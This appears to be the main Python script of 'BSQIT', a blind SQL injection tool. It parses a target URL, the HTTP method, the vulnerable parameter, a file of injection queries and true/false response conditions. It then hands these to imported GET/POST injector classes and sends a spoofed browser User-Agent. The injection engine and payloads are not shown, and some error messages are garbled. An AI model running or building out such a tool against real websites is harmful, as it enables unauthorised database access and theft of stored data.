#!/bin/python3
from modules import *
import sys
import argparse


def main():

    def parse_args():

        parser = argparse.ArgumentParser(
            description=f"Example [POST]: {sys.argv[0]} -u target.com/login.php -m post -vp username -p password=test,submit=test -tc 'welcome to admin page !'")
        parser._optionals.title = 'OPTIONS'
        parser.add_argument(
            '-u', '--url', help='target specify to inject [GET/POST]', required=True)
        parser.add_argument(
            '-m', '--method', help='http method [GET/POST]', default='post', required=True)
        parser.add_argument(
            '-vp', '--vuln-param', help='vulnerable parameter to inject the queries [GET/POST]', required=True)
        parser.add_argument(
            '-p', '--params', help='other parameters [POST]')
        parser.add_argument(
            '-q', '--query-list', help='list of query [GET/POST]', default='queries.txt')
        parser.add_argument(
            '-tc', '--true-condition', help='indicator for the true condition [GET/POST]')
        parser.add_argument(
            '-fc', '--false-condition', help='indicator for the false condition [GET/POST]')

        return parser.parse_args()

    options = parse_args()

    print(r"""[ Coded By Andi.D ]
 _____________________________________________
|            _____________________            |
|           |   Coded By Andi.D   |           |
|           |  [ BSQIT v1.0.0 ]   |           |
|           |_____________________|           |
|_____________________________________________|
""")

    print(' '.ljust(26, '_'), end='\n|')
    print(''.ljust(25, ' '), end='|\n|')
    print('[ Options ]'.center(25, ' '), end='|\n|')
    print(''.ljust(25, '_'), end='|\n|\n')

    target = (options.url).strip()
    method = (options.method).strip()
    query_list = (options.query_list).strip()

    print(f'|_[Target]         => {target}\n|')
    print(f'|_[Method]         => {method}\n|')

    if method.lower() == 'post':

        vuln_param = (options.vuln_param).strip()
        params = options.params

        if params:

            raw_params = [[j for j in (i.split('=')) if j.strip()]
                          for i in ((options.params).split(',')) if i.strip()]
            params = {}

            for i in raw_params:

                try:

                    params.update({i[0]: i[1]})

                except:

                    print('|_[Error] => invalid params\' argument')
                    exit()

        print(f'|_[Parameters]     => {params}\n|')

        trucon = options.true_condition
        falcon = options.false_condition

        if trucon and falcon:

            print('|_[Error] => yes')
            exit()

        elif not trucon and not falcon:

            print('|_[Error] => not')
            exit()

        if trucon:

            trucon = trucon.strip()

            print(f'|_[True Condition] => {trucon}\n|')

        else:

            falcon = falcon.strip()

            print(f'|_[False Condition] => {falcon}\n|')

    elif method.lower() == 'get':

        vuln_param = (options.vuln_param).strip()
        trucon = options.true_condition
        falcon = options.false_condition

        if trucon and falcon:

            print(
                '|_[Error] => cannot use false condition if true condition is in use')
            exit()

        elif not trucon and not falcon:

            print('|_[Error] => not')
            exit()

        if trucon:

            print(f'|_[True Condition] => {trucon}\n|')

        else:

            print(f'|_[False Condition] => {falcon}\n|')

    else:

        print('|_[Error] => only get/post method\n')
        exit()

    print(f'|_[Vuln Parameter] => {vuln_param}\n|')

    # payload list
    templates = ['{@}', '{?}', '{$}']
    query_list = [i for i in (
        open(query_list).read()).split('\n') if i.strip()]

    for query in query_list:

        for template in templates:

            if template not in query:

                print(
                    '|_[Error] => the query doesn\'t contain template string\n')
                exit()
    # payload list

    print('|'.ljust(26, '_'), end='\n|')
    print(''.ljust(25, ' '), end='|\n|')
    print('[ Injecting ]'.center(25, ' '), end='|\n|')
    print(''.ljust(25, '_'), end='|\n|\n')

    if method.lower() == 'post':

        # Post Method
        Post(
            target,
            vuln_param,
            params,
            trucon,
            falcon,
            query_list,
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
            }
        ).execute()
        # Post Method

    elif method.lower() == 'get':

        # Get Method
        Get(
            target,
            vuln_param,
            trucon,
            falcon,
            query_list,
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
            }
        ).execute()
        # Get Method


if __name__ == "__main__":

    main()
